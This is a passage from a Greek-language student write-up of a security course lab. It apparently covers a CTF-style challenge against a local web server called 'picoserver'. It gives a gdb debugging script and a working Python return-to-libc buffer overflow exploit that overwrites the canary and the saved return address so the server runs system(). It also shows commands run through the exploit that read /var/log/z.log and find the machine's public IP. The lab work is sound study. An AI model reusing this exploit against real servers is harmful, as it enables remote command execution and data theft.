να τον ενημερώσουμε πως αν γίνει fork να ακολουθήσει (attach) το child process. Επειδή έπρεπε συνέχεια να δίνουμε συγκεκριμένες εντολές για να το πετύχουμε αυτό, δημιουργήσαμε το παρακάτω script όπου αυτοματοποιεί λίγο την διαδικασία του debug.

**debug.sh:** 
```bash
#!/bin/sh
make

PID=ps -eaf | grep picoserver | grep -v grep | awk '{print $2}'

kill -9 $PID

gdb\
-ex 'b httpd.c:58'\
-ex 'b main.c:179'\
-ex 'b main.c:181'\
-ex 'b main.c:194'\
-ex 'b main.c:197'\
-ex 'r'\
-ex 'set follow-fork-mode child'\
-ex 'c'\
-ex 'x/39xw $sp'\
-ex 'x/a $ebp + 4'\
./picoserver
```
Το παραπάνω script κάνει compile τον server, κάνει kill αν υπάρχει ανοικτό process και τρέχει τον gdb με τις εξής εντολές:
1) Εισαγωγή breakpoints
2) run
3) Ενημερώνει τον gdb να κάνει αυτόματα attach στο πρώτο fork
4) continue
5) Εκτύπωση του frame της post_param οπως εμφανίζεται στη στοίβα. 
6) Εκτύπωση του saved $eip.

**Επιπλέον χρήσιμες εντολές gdb:**
Υπολογισμός του offset της διεύθυνσης του remote server σε σχέση με την διεύθυνση του local server:
```bash
call fprintf(stderr, "%p\n", [remote address] - [local address])
```
Υπολογισμός του offset διεύθυνσης εντολής:
```bash
call fprintf(stderr, "%p\n", [local address of command] + offset)
```
Επαλήθευση σωστής διεύθυνσης εντολής
```bash
x/a 0x0040190a
```
Επανασύνδεση του gdb με την γονική διεργασία:
```bash
attach [PID]
```
Υπολογισμός λέξεων που καταλαμβάνει το τρέχον frame:
```bash
p ($ebp - $esp) / 4
```
Εκτύπωση του τρέχοντος frame σε λέξεις:
```bash
x/40xw $sp
```
## Ερώρημα 4
Για να απαντήσουμε την ερώτηση "**Ποιο είναι το code του "Plan Z";**" ακολουθήσαμε την παρακάτω διαδικασία:

### Ανάλυση επίθεσης

Παρατηρήσαμε πως τα results του προηγούμενου ερωτήματος αναφέρονται σε κάποιο αρχείο **z.log**:
> The log is here: /var/log/z.log

έτσι δοκιμάσαμε τρόπους να κάνουμε access αυτό το αρχείο και καταλήξαμε στο συμπέρασμα πως για να γίνει αυτό θα χρειαστεί να τρέξουμε κάποια εντολή συστήματος (πχ cat). Όμως πως θα γίνει αυτό τη στιγμή που δεν έχουμε shell access στο μηχάνημα που τρέχει ο server;

Η λύση ήταν να κάνουμε ξανά **buffer overflow** στο ίδιο σημείο που το κάναμε και στο προηγούμενο ερώτημα αλλά αυτή τη φορά με διαφορετική είσοδο. Σκοπός μας ήταν να τρέξουμε την εντολή **system** η οποία παίρνει ως όρισμα μια συμβολοσειρά (char *) που περιέχει την εντολή που πρόκειται να εκτελεστεί. 

Ξέραμε ότι αν τρέξουμε την εντολή:
```bash
cat /var/log/z.log
```
μέσω της **system** η οποία κάνει fork και exec, θα δούμε με επιτυχία τα αποτελέσματα στο response γιατί όπως έχουμε δει και από το μάθημα '**Προγραμματισμός συστήματος**', όταν γίνεται fork μια διεργασία στην πραγματικότητα γίνεται αντιγραφή όλου του προγράμματος όπως ήταν εκείνη τη στιγμή στη μνήμη σε ένα νέο process και η εκτέλεση συνεχίζει από το σημείο που έγινε το fork και μετά. 

Επιπλέον, μαζί με τα περιεχόμενα της μνήμης του προγράμματος, το child process κληρονομεί ένα αντίγραφο των ανοικτών **file descriptors**. Αυτό σε συνδιασμό με την εντολή **dup2(clientfd, STDOUT_FILENO)** έχει ως αποτέλεσμα το standard output οποιασδήποτε εντολής δώσουμε να πηγαίνει κατευθείαν στον client. 

Οπότε αν τρέχαμε την εντολή cat θα βλέπαμε τα περιεχόμενα του αρχείου **z.log** στον client.

Τελος, καταλήξαμε στο συμπέρασμα πως πρέπει να κάνουμε την συνάρτηση **post_param** να επιστρέψει στην συνάρτηση **system**, για να γίνει αυτό έπρεπε:
1)  να μάθουμε με gdb την διεύθυνση που βρίσκεται αυτή η εντολή στο **.text** του προγράμματος, 
2) να κάνουμε overwrite τον **saved $eip** της **post_param** με αυτή τη διεύθυνση,
3) να κάνουμε overwrite το αμέσως επόμενο word πριν τον **saved $eip** με την τιμή ενός δείκτη σε συμβολοσειρά που θα περιέχει την εντολή προς εκτέλεση καθως και 
4) να βάλουμε την συμβολοσειρά κάπου στην στοίβα για να δούμε αν θα λειτουργήσει.

### Επίθεση
Για να κάνουμε την επίθεση, πήραμε το request.py script που είχαμε χρησιμοποιήσει και στο προηγούμενο ερώτημα και το κάναμε να δέχεται hex words.

**hex_words_request.py**

```python
import requests

headers = {
    'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://127.0.0.1:8080',
    'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
    'Connection': 'keep-alive',
    'Referer': 'http://127.0.0.1:8080/',
    'Upgrade-Insecure-Requests': '1',
}

data = b'A' * 100  # <-- buffer check
ba = bytearray.fromhex("fcd7c600") # <-- canary
ba.reverse()
data += ba  
data += b'A' * 12  # <-- saved $ebp check 0xbfffef98
ba = bytearray.fromhex("b7c55da0") # <-- saved eip
ba.reverse()
data += ba
ba = bytearray.fromhex("bfffee14")  # <-- char**
ba.reverse()
data += ba
ba = bytearray.fromhex("bfffee18") # <-- char*
ba.reverse()
data += ba
data += b"cat /var/log/z.log"

data += b'\x00'
print(data)
try:
    response = requests.post('http://127.0.0.1:8080/ultimate.html', headers=headers, data=data)
    status_code = response.status_code
    print("status_code = [" + str(status_code) + "]")
    print("text = [" + response.text + "]")
except requests.exceptions.RequestException as e:
    print(e)
```


Δοκιμάζοντας το, πράγματι πέτυχε το attack αλλά μας έφερνε μόνο την πρώτη γραμμή από το αρχείο με την εντολή **cat** επειδή το συγκεκριμένο python module (requests) είναι σχεδιασμένο να λειτουργεί με τους κανόνες του **HTTP** πρωτοκόλλου και το response απο τον server ερχόταν χωρίς να τους τηρει γιατί έλειπε το HTTP/1.1 200 OK\r\n\r\n

Έτσι, αποφασίσαμε να χρησιμοποιήσουμε κάποια άλλη εντολή που να επιστρέφει όλο το περιεχόμενο του αρχείου χωρίς αλλαγές γραμμής και βρήκαμε την παρακάτω:
```bash
paste -sd, /var/log/z.log
```
Αναπαράσταση της στοίβας μετά το buffer overflow:
```text
Stack:
			  ...........
			  ...........
			  ...........
0xbfffef24	+-------------+
			| 0x70617374  | <- 'past'
0xbfffef20  +-------------+
			| 0x65202d73  | <- 'e -s'
0xbfffef1c  +-------------+
			| 0x642c202f  | <- 'd, /'
0xbfffef18  +-------------+
			| 0x7661722f  | <- 'var/'
0xbfffef14  +-------------+
			| 0x6c6f672f  | <- 'log/'							(--- route frame ---)
0xbfffef10  +-------------+
			| 0x7a2e6c6f  | <- 'z.lo'
0xbfffef0c  +-------------+
			| 0x67000000  | <- 'g\0'
0xbfffef08  +-------------+  
			| 0xbfffef24  | <- pointer to char* command
0xbfffef04  +-------------+
			| 0xbfffef08  | <- pointer to char** command (before: is char *param_name)
0xbfffef00  +-------------+  
			| 0xb7c55d3d  | <- saved $eip, <__libc_system+0> (before: is 0x401193 <route+384>)
0xbfffeefc  +-------------+ <==================== $ebp
			| 0xbfffef98  | <- saved $ebp
0xbfffeef8  +-------------+
			| 0x00404000  | <- static address
0xbfffeef4  +-------------+		
			| 0x00404000  | <- static address					(--- post_data frame ---)
0xbfffeef0  +-------------+
			| 0x786f3100  | <- canary
0xbfffeeec	+-------------+
			| 0x41414141  |
			| . . . . . . | <- post_data buffer (100 bytes)
			| 0x41414141  |
0xbfffee88  +-------------+ <==================== $esp
			  ...........
			  ...........
			  ...........
```

Επειδή στην συγκεκριμένη επίθεση κάνουμε την συνάρτηση **post_param** να επιστρέψει κατευθείαν μέσα στον κώδικα της **system** και η system για να εκτελέσει την εντολή που της δώσαμε κάνει **fork** και την εκτελεί στον child κώδικα με **exec**, δεν χρειάστηκε να δώσουμε σωστή τιμή για τον **saved $ebp** γιατί το output της εντολής θα το βλέπαμε κανονικά ακόμα και αν το child process που εξυπηρετεί το request κρασάρει.

Τα περιεχόμενα του αρχείου **z.log**:
```
Computing, approximate answer: 41.9933411112233311
...



Plan Z: troll humans who ask stupid questions (real fun).
I told them I need 7.5 million years to compute this :D

In the meanwhile I\'m travelling through time trolling humans of the past.
Currently playing this clever dude using primitive hardware
 he\'s good but the
next move is crushing...

1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7

PS. To reach me in the past use the code: "<next move><public IP of this machine>"

PS2. To know a fish go to the water; to know a bird\'s song go to the mountains.\n'
```

Όταν είδαμε τα περιεχόμενα του αρχείου θέλαμε να υπολογίσουμε το \<next move>. Για τον υπολογισμό του, αρχικά νομίζαμε ότι ήταν κάποιο cipher text και δοκιμάσαμε διάφορους αλγόριθμους που έχουν αναφερθεί στο μάθημα, χωρίς επιτυχία. 

Τέλος μετά από ψάξιμο στο google καταλήξαμε στο συμπέρασμα ότι είναι συντεταγμένες κινήσεων στο σκάκι για τον διάσημο αγώνα ***Deep Blue (Computer) vs Garry Kasparov*** . :D

Στην επόμενη κίνηση το Deep Blue νίκησε "**19.c4 1-0**", οπότε το next move ηταν το "**c4**". 

Για την **public ip** κάναμε ακριβώς την ίδια επίθεση όπως στην αρχή του βήματος, αυτή τη φορά όμως αλλάξαμε το command που δώσαμε στη συνάρτηση system σε:
```bash
dig +short myip.opendns.com @resolver1.opendns.com
```
ώστε να βρούμε την public ip η οποία ήταν η "**3.85.143.73**". 

Βάλαμε το **c4** στην αρχή της και καταλήξαμε πως:

"\<**next move**>\<**public IP of this machine**>":  "**c43.85.143.73**"

Επομένως τo code του Plan Z είναι το "**c43.85.143.73**"

Ευχαριστούμε :D

Σημείωση: Τα python scripts είναι γραμμένα σε **python3**.
